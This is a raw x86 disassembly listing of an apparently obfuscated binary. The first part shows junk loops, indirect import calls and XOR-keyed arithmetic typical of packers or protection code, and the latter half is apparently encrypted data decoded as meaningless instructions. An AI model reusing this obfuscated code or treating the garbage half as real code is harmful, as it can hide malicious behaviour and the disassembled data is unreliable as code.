  418995:	cmp    DWORD PTR ds:0x429020,0x18
  41899c:	ja     0x4189bf
  4189a2:	jmp    0x4189b2
  4189a7:	push   0x720f
  4189ac:	call   DWORD PTR ds:0x43003f
  4189b2:	cmp    DWORD PTR ds:0x429020,0x14
  4189b9:	jb     0x418988
  4189bf:	mov    ebx,DWORD PTR [ebp-0x8]
  4189c2:	xor    edx,eax
  4189c4:	xor    ebx,eax
  4189c6:	and    DWORD PTR ds:0x429020,0x42b014
  4189d0:	sub    edx,ebx
  4189d2:	sub    edx,esi
  4189d4:	xor    edx,eax
  4189d6:	sbb    DWORD PTR ds:0x42c018,edi
  4189dc:	mov    DWORD PTR [ebp+0x8],edx
  4189df:	xor    edx,0x13c8
  4189e5:	mov    edx,DWORD PTR [ebp+0x8]
  4189e8:	and    DWORD PTR ds:0x42a008,0x0
  4189f2:	mov    ebx,DWORD PTR ds:0x42a008
  4189f8:	inc    ebx
  4189f9:	mov    DWORD PTR ds:0x42a008,ebx
  4189ff:	cmp    DWORD PTR ds:0x42a008,0x9
  418a06:	jg     0x418a5e
  418a0c:	jmp    0x418a37
  418a11:	push   DWORD PTR [ebp-0xc]
  418a14:	push   DWORD PTR [ebp-0x18]
  418a17:	push   0x8dc5
  418a1c:	push   0x3b62
  418a21:	push   DWORD PTR [ebp-0x24]
  418a24:	push   DWORD PTR [ebp-0x24]
  418a27:	push   0x13d0
  418a2c:	push   0x42f00c
  418a31:	call   DWORD PTR ds:0x430047
  418a37:	cmp    DWORD PTR ds:0x42a008,0x8
  418a3e:	jne    0x418a51
  418a44:	mov    ebx,DWORD PTR ds:0x42a008
  418a4a:	inc    ebx
  418a4b:	mov    DWORD PTR ds:0x42a008,ebx
  418a51:	cmp    DWORD PTR ds:0x42a008,0x12
  418a58:	jb     0x4189f2
  418a5e:	mov    ebx,DWORD PTR [ebp-0x58]
  418a61:	sbb    DWORD PTR ds:0x42c008,0x503f
  418a6b:	add    edx,0x5708f1
  418a71:	sub    DWORD PTR ds:0x42c01c,0x42d00c
  418a7b:	imul   edx,ebx
  418a7e:	and    ebx,DWORD PTR ds:0x42a004
  418a84:	mov    DWORD PTR [ebp-0x58],edx
  418a87:	mov    edx,DWORD PTR [ebp+0x8]
  418a8a:	and    DWORD PTR ds:0x42b004,0x0
  418a94:	jmp    0x418aa6
  418a99:	mov    ebx,DWORD PTR ds:0x42b004
  418a9f:	inc    ebx
  418aa0:	mov    DWORD PTR ds:0x42b004,ebx
  418aa6:	cmp    DWORD PTR ds:0x42b004,0x1a
  418aad:	jae    0x418add
  418ab3:	cmp    DWORD PTR ds:0x42b004,0x1b
  418aba:	ja     0x418add
  418ac0:	jmp    0x418ad8
  418ac5:	push   0x87d9
  418aca:	push   DWORD PTR [ebp-0x10]
  418acd:	push   0x6435
  418ad2:	call   DWORD PTR ds:0x43004b
  418ad8:	jmp    0x418a99
  418add:	mov    ebx,DWORD PTR [ebp-0x54]
  418ae0:	sub    DWORD PTR ds:0x42c01c,0x42d010
  418aea:	add    edx,0x64f893
  418af0:	or     edx,ebx
  418af2:	and    ebx,DWORD PTR ds:0x429000
  418af8:	mov    DWORD PTR [ebp-0x54],edx
  418afb:	mov    edx,DWORD PTR [ebp+0x8]
  418afe:	xor    DWORD PTR ds:0x42a00c,ebx
  418b04:	mov    ebx,DWORD PTR [ebp-0x50]
  418b07:	add    DWORD PTR ds:0x42a00c,0x583e
  418b11:	add    edx,ecx
  418b13:	xor    DWORD PTR ds:0x42a000,0x5790
  418b1d:	xor    edx,ebx
  418b1f:	mov    DWORD PTR [ebp-0x50],edx
  418b22:	xor    ebx,0x79bd
  418b28:	mov    edx,DWORD PTR [ebp+0x8]
  418b2b:	adc    ebx,DWORD PTR ds:0x42d014
  418b31:	mov    ebx,DWORD PTR [ebp-0x4c]
  418b34:	adc    DWORD PTR ds:0x42d010,0xcea
  418b3e:	add    edx,edi
  418b40:	and    edx,ebx
  418b42:	mov    DWORD PTR [ebp-0x4c],edx
  418b45:	xor    edx,0x6e49
  418b4b:	mov    edx,DWORD PTR [ebp+0x8]
  418b4e:	mov    ebx,DWORD PTR [ebp-0x48]
  418b51:	xor    DWORD PTR ds:0x429008,0x656f
  418b5b:	lea    edx,[ebx+edx*1+0x241fcde]
  418b62:	mov    DWORD PTR [ebp-0x48],edx
  418b65:	and    ebx,edx
  418b67:	mov    edx,DWORD PTR [ebp+0x8]
  418b6a:	adc    DWORD PTR ds:0x42b000,edx
  418b70:	mov    ebx,0xfa5e1521
  418b75:	sub    ebx,edx
  418b77:	sub    edx,DWORD PTR ds:0x42901c
  418b7d:	add    ebx,DWORD PTR [ebp-0x44]
  418b80:	inc    DWORD PTR ds:0x42d014
  418b86:	mov    DWORD PTR [ebp-0x44],ebx
  418b89:	mov    edx,DWORD PTR [ebp+0x8]
  418b8c:	xor    edx,eax
  418b8e:	xor    DWORD PTR ds:0x429000,0x14c2
  418b98:	add    edx,esi
  418b9a:	jne    0x418971
  418ba0:	jmp    0x41d78a
  418ba5:	and    DWORD PTR ds:0x42d00c,0x0
  418baf:	xor    ebx,ebx
  418bb1:	xor    ebx,DWORD PTR ds:0x42d00c
  418bb7:	inc    ebx
  418bb8:	mov    DWORD PTR ds:0x42d00c,ebx
  418bbe:	cmp    DWORD PTR ds:0x42d00c,0x28
  418bc5:	jbe    0x418bed
  418bcb:	jmp    0x418be0
  418bd0:	push   0x42a004
  418bd5:	push   0x42f169
  418bda:	call   DWORD PTR ds:0x43000b
  418be0:	cmp    DWORD PTR ds:0x42d00c,0x18
  418be7:	jb     0x418baf
  418bed:	mov    edx,DWORD PTR [ebp-0xc]
  418bf0:	mov    ebx,DWORD PTR ds:0x429014
  418bf6:	sub    ebx,DWORD PTR ds:0x429018
  418bfc:	mov    DWORD PTR ds:0x429014,ebx
  418c02:	sub    edx,esi
  418c04:	and    DWORD PTR ds:0x42c000,0x0
  418c0e:	jmp    0x418c22
  418c13:	xor    ebx,ebx
  418c15:	add    ebx,DWORD PTR ds:0x42c000
  418c1b:	inc    ebx
  418c1c:	mov    DWORD PTR ds:0x42c000,ebx
  418c22:	cmp    DWORD PTR ds:0x42c000,0x15
  418c29:	jae    0x418c70
  418c2f:	cmp    DWORD PTR ds:0x42c000,0xc
  418c36:	jg     0x418c70
  418c3c:	jmp    0x418c51
  418c41:	push   0x42a00c
  418c46:	push   0x35fa
  418c4b:	call   DWORD PTR ds:0x43000f
  418c51:	cmp    DWORD PTR ds:0x42c000,0xb
  418c58:	jne    0x418c6b
  418c5e:	mov    ebx,DWORD PTR ds:0x42c000
  418c64:	inc    ebx
  418c65:	mov    DWORD PTR ds:0x42c000,ebx
  418c6b:	jmp    0x418c13
  418c70:	xor    edx,eax
  418c72:	dec    DWORD PTR ds:0x429028
  418c78:	mov    DWORD PTR [ebp-0x5c],edx
  418c7b:	sub    ebx,DWORD PTR ds:0x42d014
  418c81:	mov    edx,DWORD PTR [ebp-0x10]
  418c84:	or     ebx,DWORD PTR ds:0x42d004
  418c8a:	mov    ebx,DWORD PTR [ebp-0x8]
  418c8d:	xor    edx,eax
  418c8f:	xor    ebx,eax
  418c91:	sub    edx,ebx
  418c93:	xor    DWORD PTR ds:0x429008,0x42b01c
  418c9d:	sub    edx,esi
  418c9f:	and    DWORD PTR ds:0x42a010,0x70aa
  418ca9:	xor    edx,eax
  418cab:	mov    DWORD PTR ds:0x42b01c,0x72e9
  418cb5:	mov    DWORD PTR [ebp-0x10],edx
  418cb8:	mov    edx,DWORD PTR [ebp-0x14]
  418cbb:	mov    DWORD PTR [ebp+0x8],edx
  418cbe:	mov    DWORD PTR ds:0x42d00c,0x2349
  418cc8:	jmp    0x418ea8
  418ccd:	mov    edx,DWORD PTR [ebp+0x8]
  418cd0:	and    DWORD PTR ds:0x42b014,0x0
  418cda:	mov    ebx,DWORD PTR ds:0x42b014
  418ce0:	inc    ebx
  418ce1:	mov    DWORD PTR ds:0x42b014,ebx
  418ce7:	cmp    DWORD PTR ds:0x42b014,0x6
  418cee:	jle    0x418d26
  418cf4:	jmp    0x418cff
  418cf9:	call   DWORD PTR ds:0x430013
  418cff:	cmp    DWORD PTR ds:0x42b014,0x5
  418d06:	jne    0x418d19
  418d0c:	mov    ebx,DWORD PTR ds:0x42b014
  418d12:	inc    ebx
  418d13:	mov    DWORD PTR ds:0x42b014,ebx
  418d19:	cmp    DWORD PTR ds:0x42b014,0x10
  418d20:	jb     0x418cda
  418d26:	mov    ebx,DWORD PTR [ebp-0x8]
  418d29:	adc    DWORD PTR ds:0x429010,0x42d018
  418d33:	xor    edx,eax
  418d35:	and    DWORD PTR ds:0x42d00c,0x4b9
  418d3f:	xor    ebx,eax
  418d41:	and    DWORD PTR ds:0x429004,0x114f
  418d4b:	sub    edx,ebx
  418d4d:	sub    edx,esi
  418d4f:	and    DWORD PTR ds:0x42d008,0x0
  418d59:	jmp    0x418d6b
  418d5e:	mov    ebx,DWORD PTR ds:0x42d008
  418d64:	inc    ebx
  418d65:	mov    DWORD PTR ds:0x42d008,ebx
  418d6b:	cmp    DWORD PTR ds:0x42d008,0x1b
  418d72:	jae    0x418da0
  418d78:	cmp    DWORD PTR ds:0x42d008,0x22
  418d7f:	jg     0x418da0
  418d85:	jmp    0x418d9b
  418d8a:	push   0x42f107
  418d8f:	push   DWORD PTR [ebp-0x10]
  418d92:	push   DWORD PTR [ebp-0x24]
  418d95:	call   DWORD PTR ds:0x430017
  418d9b:	jmp    0x418d5e
  418da0:	xor    edx,eax
  418da2:	or     DWORD PTR ds:0x429008,ecx
  418da8:	mov    DWORD PTR [ebp+0x8],edx
  418dab:	mov    edx,DWORD PTR [ebp+0x8]
  418dae:	mov    ebx,DWORD PTR [ebp-0x58]
  418db1:	sub    DWORD PTR ds:0x429020,0x34c1
  418dbb:	add    edx,0x5708f1
  418dc1:	add    DWORD PTR ds:0x42a000,0x6667
  418dcb:	imul   edx,ebx
  418dce:	movzx  ebx,BYTE PTR ds:0x42b018
  418dd5:	or     DWORD PTR ds:0x42d004,ebx
  418ddb:	mov    DWORD PTR [ebp-0x58],edx
  418dde:	mov    edx,DWORD PTR [ebp+0x8]
  418de1:	sub    DWORD PTR ds:0x429018,0x429014
  418deb:	mov    ebx,DWORD PTR [ebp-0x54]
  418dee:	xor    DWORD PTR ds:0x42d018,0x42a00c
  418df8:	add    edx,0x64f893
  418dfe:	or     edx,ebx
  418e00:	adc    DWORD PTR ds:0x42901c,ecx
  418e06:	mov    DWORD PTR [ebp-0x54],edx
  418e09:	and    DWORD PTR ds:0x42d008,0x0
  418e13:	jmp    0x418e25
  418e18:	mov    ebx,DWORD PTR ds:0x42d008
  418e1e:	inc    ebx
  418e1f:	mov    DWORD PTR ds:0x42d008,ebx
  418e25:	cmp    DWORD PTR ds:0x42d008,0x13
  418e2c:	jae    0x418e6e
  418e32:	cmp    DWORD PTR ds:0x42d008,0x22
  418e39:	jb     0x418e6e
  418e3f:	jmp    0x418e69
  418e44:	push   0x30b6
  418e49:	push   0x7ba0
  418e4e:	push   0x429014
  418e53:	push   0x2a48
  418e58:	push   DWORD PTR [ebp-0x10]
  418e5b:	push   0x4d58
  418e60:	push   DWORD PTR [ebp-0xc]
  418e63:	call   DWORD PTR ds:0x43001b
  418e69:	jmp    0x418e18
  418e6e:	mov    edx,DWORD PTR [ebp+0x8]
  418e71:	mov    ebx,DWORD PTR [ebp-0x50]
  418e74:	add    edx,ecx
  418e76:	xor    edx,ebx
  418e78:	mov    DWORD PTR [ebp-0x50],edx
  418e7b:	mov    edx,DWORD PTR [ebp+0x8]
  418e7e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418e81:	add    edx,edi
  418e83:	and    edx,ebx
  418e85:	mov    DWORD PTR [ebp-0x4c],edx
  418e88:	mov    edx,DWORD PTR [ebp+0x8]
  418e8b:	mov    ebx,DWORD PTR [ebp-0x48]
  418e8e:	lea    edx,[ebx+edx*1+0x241fcde]
  418e95:	mov    DWORD PTR [ebp-0x48],edx
  418e98:	mov    edx,DWORD PTR [ebp+0x8]
  418e9b:	mov    ebx,0xfa5e1521
  418ea0:	sub    ebx,edx
  418ea2:	add    ebx,DWORD PTR [ebp-0x44]
  418ea5:	mov    DWORD PTR [ebp-0x44],ebx
  418ea8:	mov    edx,DWORD PTR [ebp+0x8]
  418eab:	xor    edx,eax
  418ead:	add    edx,esi
  418eaf:	jne    0x418ccd
  418eb5:	mov    edx,DWORD PTR [ebp-0xc]
  418eb8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ebf:	mov    bl,BYTE PTR [ebp-0x1]
  418ec2:	cmp    dl,bl
  418ec4:	je     0x41b305
  418eca:	mov    ecx,DWORD PTR [ebp-0x5c]
  418ecd:	mov    edx,DWORD PTR [ebp-0xc]
  418ed0:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ed7:	mov    ebx,DWORD PTR [ebp+0xc]
  418eda:	xor    ecx,eax
  418edc:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272ec]
  418ee3:	jne    0x41d79c
  418ee9:	mov    ecx,DWORD PTR [ebp-0x5c]
  418eec:	mov    edx,DWORD PTR [ebp+0xc]
  418eef:	xor    ecx,eax
  418ef1:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272ec]
  418ef9:	mov    edx,DWORD PTR [ebp-0x18]
  418efc:	xor    edx,eax
  418efe:	add    edx,esi
  418f00:	cmp    ecx,edx
  418f02:	mov    ecx,DWORD PTR [ebp-0x14]
  418f05:	mov    DWORD PTR [ebp+0x8],ecx
  418f08:	mov    ecx,DWORD PTR [ebp+0x8]
  418f0b:	je     0x421f6a
  418f11:	xor    ecx,eax
  418f13:	add    ecx,esi
  418f15:	mov    ecx,0x242ebcc
  418f1a:	je     0x41d6f0
  418f20:	mov    edx,DWORD PTR [ebp+0x8]
  418f23:	mov    ebx,DWORD PTR [ebp-0x8]
  418f26:	xor    edx,eax
  418f28:	xor    ebx,eax
  418f2a:	sub    edx,ebx
  418f2c:	sub    edx,esi
  418f2e:	xor    edx,eax
  418f30:	mov    DWORD PTR [ebp+0x8],edx
  418f33:	mov    edx,DWORD PTR [ebp+0x8]
  418f36:	mov    ebx,DWORD PTR [ebp-0x58]
  418f39:	add    edx,0x5708f1
  418f3f:	imul   edx,ebx
  418f42:	mov    DWORD PTR [ebp-0x58],edx
  418f45:	mov    edx,DWORD PTR [ebp+0x8]
  418f48:	mov    ebx,DWORD PTR [ebp-0x54]
  418f4b:	add    edx,0x64f893
  418f51:	or     edx,ebx
  418f53:	mov    DWORD PTR [ebp-0x54],edx
  418f56:	mov    edx,DWORD PTR [ebp+0x8]
  418f59:	mov    ebx,DWORD PTR [ebp-0x50]
  418f5c:	add    edx,ecx
  418f5e:	jmp    0x41b2c1
  418f63:	stos   BYTE PTR es:[edi],al
  418f64:	fsubr  QWORD PTR [ebx-0x14]
  418f67:	sti    
  418f68:	mov    ebx,0xc4df9c99
  418f6d:	add    DWORD PTR [ecx+0x4d],esi
  418f70:	pop    esp
  418f71:	cmc    
  418f72:	cld    
  418f73:	adc    DWORD PTR ds:0x5f307a7d,ebx
  418f79:	jp     0x418ff5
  418f7b:	in     al,0x4c
  418f7d:	add    DWORD PTR [edi+eax*2+0x18],edx
  418f81:	add    DWORD PTR [edx+0x6d],ebp
  418f84:	or     eax,0x237fe291
  418f89:	mov    eax,0x226a99ef
  418f8e:	scas   eax,DWORD PTR es:[edi]
  418f8f:	in     al,dx
  418f90:	sub    DWORD PTR [ecx-0x49745f06],ecx
  418f96:	dec    esi
  418f97:	mov    dh,0xad
  418f99:	push   cs
  418f9a:	lea    esp,[ecx-0x37a35cf6]
  418fa0:	adc    al,0xc7
  418fa2:	xor    ah,ch
  418fa4:	sbb    al,0x27
  418fa6:	(bad)  
  418fa8:	xchg   ah,bh
  418faa:	pop    edx
  418fab:	or     ah,BYTE PTR [ebx+0x630f0c9a]
  418fb1:	(bad)  
  418fb2:	daa    
  418fb3:	dec    esp
  418fb4:	and    eax,0x80cdf9ab
  418fb9:	sbb    edi,DWORD PTR [esi-0x3a]
  418fbc:	xor    eax,0x9b949e60
  418fc1:	dec    esi
  418fc2:	mov    ds:0xe18c7c11,eax
  418fc7:	cmp    al,0x5a
  418fc9:	jmp    0x2f4ff3de
  418fce:	inc    ebx
  418fcf:	cs push ecx
  418fd1:	out    0x96,al
  418fd3:	ins    BYTE PTR es:[edi],dx
  418fd4:	mov    ds:0xe8a92870,al
  418fd9:	xor    BYTE PTR [esi+0x75],ch
  418fdc:	call   0x9921:0xb6543cb
  418fe3:	das    
  418fe4:	inc    ecx
  418fe5:	cld    
  418fe6:	mov    al,0x4e
  418fe8:	jp     0x418fa5
  418fea:	xchg   BYTE PTR [ecx-0x1e075927],cl
  418ff0:	mov    ah,0x3c
  418ff2:	test   eax,0xcfaf2a50
  418ff7:	aaa    
  418ff8:	bound  ecx,QWORD PTR [eax]
  418ffa:	mov    esp,esp
  418ffc:	pop    es
  418ffd:	xor    al,0x94
  418fff:	int3   
  419000:	jmp    0xd2aec27b
  419005:	or     eax,0x393df34a
  41900a:	mov    dh,0xeb
  41900c:	mov    esi,0xc7f33926
  419011:	(bad)  
  419012:	imul   edi,DWORD PTR [edx+0x2e],0x24791a07
  419019:	std    
  41901a:	pop    ecx
  41901b:	jne    0x418fbd
  41901d:	mov    eax,0x102f7ee0
  419022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419023:	cs or  edi,ebp
  419026:	mov    ds:0xc48f8610,eax
  41902b:	sti    
  41902c:	ficom  DWORD PTR [edx]
  41902e:	pop    esi
  41902f:	jo     0x41907b
  419031:	mov    al,ds:0xcebb4232
  419036:	into   
  419037:	pop    edi
  419038:	sub    bh,BYTE PTR [esi*8+0x1ce617c4]
  41903f:	mov    WORD PTR [eax+ecx*1],?
  419042:	mov    esi,0x96ee6929
  419047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419048:	mov    bh,0x5
  41904a:	or     edi,DWORD PTR [eax-0x5b]
  41904d:	adc    esi,esp
  41904f:	mov    dl,0x36
  419051:	jne    0x419069
  419053:	xlat   BYTE PTR ds:[ebx]
  419054:	adc    eax,0x21624c9d
  419059:	xor    BYTE PTR [ebx+0x1abfa286],dl
  41905f:	loope  0x419005
  419061:	cmp    ah,dl
  419063:	xchg   esi,eax
  419064:	dec    esi
  419065:	adc    DWORD PTR [esi+0x70],ebx
  419068:	jle    0x419021
  41906a:	cmp    DWORD PTR [edx-0x28],eax
  41906d:	(bad)  
  41906e:	fadd   QWORD PTR [ebp+0x13]
  419071:	aad    0x47
  419073:	imul   edi,DWORD PTR ds:0x46b4805d,0x77
  41907a:	into   
  41907b:	(bad)  
  41907c:	fmulp  st(4),st
  41907e:	stc    
  41907f:	loope  0x41901f
  419081:	inc    esp
  419082:	mov    bh,0x50
  419084:	shl    esp,1
  419086:	cs std 
  419088:	call   0x9c8a:0x19f5bdd6
  41908f:	es cdq 
  419091:	adc    BYTE PTR [edx-0x46454967],ch
  419097:	call   0xdda7:0x37acc484
  41909e:	inc    eax
  41909f:	jo     0x4190a1
  4190a1:	lods   eax,DWORD PTR ds:[esi]
  4190a2:	mov    es,esp
  4190a4:	iret   
  4190a5:	popa   
  4190a6:	dec    edx
  4190a7:	mov    cl,0x21
  4190a9:	fld    TBYTE PTR [ecx]
  4190ab:	in     al,0x85
  4190ad:	mov    bl,0x11
  4190af:	nop
  4190b0:	adc    DWORD PTR [ecx-0x378630a7],eax
  4190b6:	sar    BYTE PTR [ebp-0x6b3000b7],cl
  4190bc:	daa    
  4190bd:	xlat   BYTE PTR ds:[ebx]
  4190be:	shr    BYTE PTR [edi],0xf6
  4190c1:	jnp    0x4190dc
  4190c3:	mov    ds:0xb55d6f05,al
  4190c8:	mov    ds:0x1386d15c,eax
  4190cd:	pop    esi
  4190ce:	add    ebx,ebp
  4190d0:	outs   dx,DWORD PTR ds:[esi]
  4190d1:	ja     0x41912e
  4190d3:	pop    ebp
  4190d4:	adc    eax,0xa1de766c
  4190d9:	xor    al,0x5e
  4190db:	mov    ebp,0x55226262
  4190e0:	xor    dl,cl
  4190e2:	jl     0x419123
  4190e4:	inc    esi
  4190e5:	ds hlt 
  4190e7:	sbb    al,0x20
  4190e9:	sub    DWORD PTR [ebx+0x5a],0x9626dd29
  4190f0:	adc    eax,0x348478a8
  4190f5:	test   ecx,ebp
  4190f7:	jmp    FWORD PTR [eax+0x5]
  4190fa:	jl     0x419169
  4190fc:	inc    edx
  4190fd:	push   ebx
  4190fe:	adc    eax,0x7c364cfb
  419103:	in     al,0x1b
  419105:	or     eax,0x76e17d13
  41910a:	mov    al,0xc2
  41910c:	xor    edi,DWORD PTR [ecx-0x5a]
  41910f:	test   eax,0x939675d8
  419114:	in     eax,0x6d
  419116:	cld    
  419117:	jmp    0x419177
  419119:	arpl   WORD PTR [edx+ecx*2-0x1b],di
  41911d:	rcl    bl,cl
  41911f:	jne    0x4190a4
  419121:	inc    edx
  419122:	fsubr  DWORD PTR [esi]
  419124:	mov    dh,0x88
  419126:	ins    DWORD PTR es:[edi],dx
  419127:	(bad)  
  419128:	xor    ch,bh
  41912a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41912b:	xchg   esp,eax
  41912c:	(bad)  
  41912e:	and    ebp,0x5
  419131:	cwde   
  419132:	lods   al,BYTE PTR ds:[esi]
  419133:	ja     0x419186
  419135:	inc    esi
  419136:	pop    esp
  419137:	add    edi,DWORD PTR [ebx-0x581e2c3]
  41913d:	je     0x419149
  41913f:	out    dx,al
  419140:	repnz sbb DWORD PTR [eax-0x2969e2f0],0x4218d4af
  41914b:	and    BYTE PTR [ecx],dh
  41914d:	adc    BYTE PTR [edx],dh
  41914f:	add    DWORD PTR [esi],ebp
  419151:	test   BYTE PTR [esi+ebx*1+0x5f703114],cl
  419158:	inc    ebx
  419159:	ins    DWORD PTR es:[edi],dx
  41915a:	les    ebx,FWORD PTR [ebx+0xa79e701]
  419160:	push   edx
  419161:	shl    BYTE PTR [ebp-0x51],0x3a
  419165:	setns  BYTE PTR [esi-0x5]
  419169:	lds    eax,FWORD PTR [ecx-0x413db4c7]
  41916f:	ds push ecx
  419171:	mov    edi,0xd97b333b
  419176:	shl    DWORD PTR [ebp-0x586df8cd],cl
  41917c:	mov    cl,0xdd
  41917e:	cmp    eax,0xedb6c87f
  419183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419184:	enter  0xc972,0x9b
  419188:	gs inc esp
  41918a:	add    esi,ecx
  41918c:	js     0x419193
  41918e:	dec    edi
  41918f:	shl    ebp,1
  419191:	(bad)  
  419193:	mov    ah,0xde
  419195:	or     BYTE PTR [ebp-0x6659a692],bl
  41919b:	add    ecx,ecx
  41919d:	jbe    0x41912a
  41919f:	jne    0x4191ff
  4191a1:	repnz sbb dh,BYTE PTR [ebp+0x6bde9bf0]
  4191a8:	mov    cl,0xed
  4191aa:	mov    ch,0xa2
  4191ac:	mov    cl,0x2b
  4191ae:	jne    0x4191fc
  4191b0:	shr    DWORD PTR [eax-0x33446ce3],1
  4191b6:	loop   0x4191ad
  4191b8:	lods   al,BYTE PTR ds:[esi]
  4191b9:	or     eax,0xbede5027
  4191be:	pop    esi
  4191bf:	mov    eax,ds:0x78285602
  4191c4:	xor    dh,0xe5
  4191c7:	and    BYTE PTR [ebx-0x78],bl
  4191ca:	pop    esp
  4191cb:	dec    ebx
  4191cc:	fwait
  4191cd:	(bad)  
  4191ce:	sbb    eax,DWORD PTR [edi+0x6b]
  4191d1:	icebp  
  4191d2:	repz jb 0x4191a9
  4191d5:	pop    ds
  4191d6:	xchg   ecx,eax
  4191d7:	sbb    BYTE PTR [eax-0x60688a1f],cl
  4191dd:	outs   dx,BYTE PTR ds:[esi]
  4191de:	aas    
  4191df:	inc    edx
  4191e0:	cmp    al,0x8b
  4191e2:	mov    ah,0x6f
  4191e4:	mov    bl,0x4a
  4191e6:	fwait
  4191e7:	out    0xac,eax
  4191e9:	pop    edx
  4191ea:	jl     0x41920c
  4191ec:	cmp    eax,0xe6d4ec91
  4191f1:	mov    al,0x9d
  4191f3:	cs mov al,0xde
  4191f6:	inc    edx
  4191f7:	pop    esi
  4191f8:	mov    esp,0x6afad874
  4191fd:	test   bl,0x4c
  419200:	ss dec edi
  419202:	retf   
  419203:	ja     0x41921e
  419205:	mov    dl,0x33
  419207:	daa    
  419208:	mov    esi,0x6666502
  41920d:	pop    eax
  41920e:	jne    0x41928e
  419210:	call   0x66d4:0xcdf3a539
  419217:	fiadd  DWORD PTR [eax]
  419219:	in     al,0x7d
  41921b:	ret    0x212a
  41921e:	xor    al,0x59
  419220:	popa   
  419221:	sub    bl,BYTE PTR [edi+0x18]
  419224:	mov    eax,ds:0x68061ea9
  419229:	add    al,ch
  41922b:	clc    
  41922c:	xchg   edx,ecx
  41922e:	or     DWORD PTR [esi+ecx*1-0x1b],edx
  419232:	and    cl,BYTE PTR [ebx+0x1d]
  419235:	cmp    eax,0x2b55d791
  41923a:	pop    ebx
  41923b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41923c:	jnp    0x4192b0
  41923e:	jbe    0x4191d9
  419240:	jnp    0x41928c
  419242:	rcl    ebx,1
  419244:	mov    ah,0x3f
  419246:	cmc    
  419247:	jnp    0x4192a2
  419249:	jge    0x4191e6
  41924b:	cli    
  41924c:	ins    DWORD PTR es:[edi],dx
  41924d:	fsubr  DWORD PTR [esi+0x2ede4395]
  419253:	jmp    0x41929f
  419255:	dec    eax
  419256:	ret    0x5c0c
  419259:	out    0xc6,eax
  41925b:	xchg   dl,ch
  41925d:	add    al,0x93
  41925f:	dec    eax
  419260:	pushf  
  419261:	fs adc eax,0x9d51c3db
  419267:	inc    eax
  419268:	stos   BYTE PTR es:[edi],al
  419269:	pop    edx
  41926a:	mov    al,ds:0xd7670d23
  41926f:	mov    edx,0xd0a158b7
  419274:	repz and ch,BYTE PTR [edi-0x38]
  419278:	mov    dh,0xf3
  41927a:	jmp    0x4192a3
  41927c:	test   al,0xf
  41927e:	repz fldcw WORD PTR [esp+eax*4]
  419282:	das    
  419283:	pop    es
  419284:	add    DWORD PTR [esi-0x27],ebp
  419287:	aas    
  419288:	cmp    ebp,ebx
  41928a:	or     eax,0xa76ae869
  41928f:	inc    edx
  419290:	or     BYTE PTR ds:0x564ec6f2,0x34
  419297:	sub    eax,0xf1421027
  41929c:	xchg   BYTE PTR [edx-0x780288fc],dl
  4192a2:	xchg   edi,eax
  4192a3:	sbb    al,BYTE PTR [ecx-0x48b4d14a]
  4192a9:	ficom  WORD PTR [ebp-0x6e]
  4192ac:	cmp    BYTE PTR [edx],al
  4192ae:	push   edx
  4192af:	xchg   ecx,eax
  4192b0:	mov    edi,0xef1b9454
  4192b5:	pop    esi
  4192b6:	inc    ebp
  4192b7:	repz dec eax
  4192b9:	adc    al,0x8e
  4192bb:	xor    dh,ch
  4192bd:	push   edi
  4192be:	sbb    DWORD PTR [ecx],ebp
  4192c0:	sub    dh,dh
  4192c2:	inc    edi
  4192c3:	dec    esp
  4192c4:	fmul   DWORD PTR [ebx+0x7f]
  4192c7:	push   0x846f46fd
  4192cc:	loop   0x41932f
  4192ce:	inc    eax
  4192cf:	out    dx,eax
  4192d0:	jno    0x4192ac
  4192d2:	(bad)  
  4192d4:	pop    ss
  4192d5:	jmp    0x419327
  4192d7:	popa   
  4192d8:	add    eax,0xcac988b2
  4192dd:	dec    ebx
  4192de:	xchg   esi,eax
  4192df:	sbb    BYTE PTR [edx+0x232bf568],ch
  4192e5:	xchg   BYTE PTR [edi-0x1b850e43],al
  4192eb:	icebp  
  4192ec:	jbe    0x4192ab
  4192ee:	out    dx,al
  4192ef:	fnstenv [edx]
  4192f1:	pop    edi
  4192f2:	test   BYTE PTR [ecx-0x56],al
  4192f5:	cli    
  4192f6:	xchg   edx,eax
  4192f7:	sub    eax,0x3aaf2fe9
  4192fc:	clc    
  4192fd:	inc    ecx
  4192fe:	pop    ebp
  4192ff:	nop
  419300:	add    DWORD PTR [ebx+eax*1+0x2f57aec0],ebx
  419307:	or     eax,0xc7f45e8e
  41930c:	jmp    DWORD PTR [ebx+0x76]
  41930f:	jg     0x4192df
  419311:	and    BYTE PTR [ebx],al
  419313:	outs   dx,BYTE PTR ds:[esi]
  419314:	mov    dl,0x58
  419316:	pop    edx
  419317:	outs   dx,BYTE PTR ds:[esi]
  419318:	in     al,dx
  419319:	out    dx,al
  41931a:	mov    ebp,0xd10171d8
  41931f:	lods   eax,DWORD PTR ds:[esi]
  419320:	and    dh,BYTE PTR [esi]
  419322:	mov    BYTE PTR [ebp-0x66],dh
  419325:	adc    BYTE PTR [eax-0x732d9939],bh
  41932b:	jl     0x419378
  41932d:	mov    gs,WORD PTR [eax+0x34c1bcff]
  419333:	pop    ebx
  419334:	or     al,0x47
  419336:	das    
  419337:	mov    eax,ds:0x22fffa02
  41933c:	sbb    ecx,esp
  41933e:	out    0xe8,al
  419340:	inc    ecx
  419341:	push   0xffffff91
  419343:	popa   
  419344:	popf   
  419345:	enter  0xbae,0xae
  419349:	cmp    DWORD PTR [edx-0x1d4abe4],esp
  41934f:	dec    esi
  419350:	fisttp WORD PTR [ebp-0x7]
  419353:	icebp  
  419354:	or     eax,0x70ce55f9
  419359:	xor    eax,0xeb321e2a
  41935e:	icebp  
  41935f:	lahf   
  419360:	out    0xe0,eax
  419362:	enter  0x3b67,0x10
  419366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419367:	cmp    al,0x2d
  419369:	jns    0x41939d
  41936b:	(bad)  
  41936c:	cmp    BYTE PTR [ebx],bl
  41936e:	xor    ebp,edx
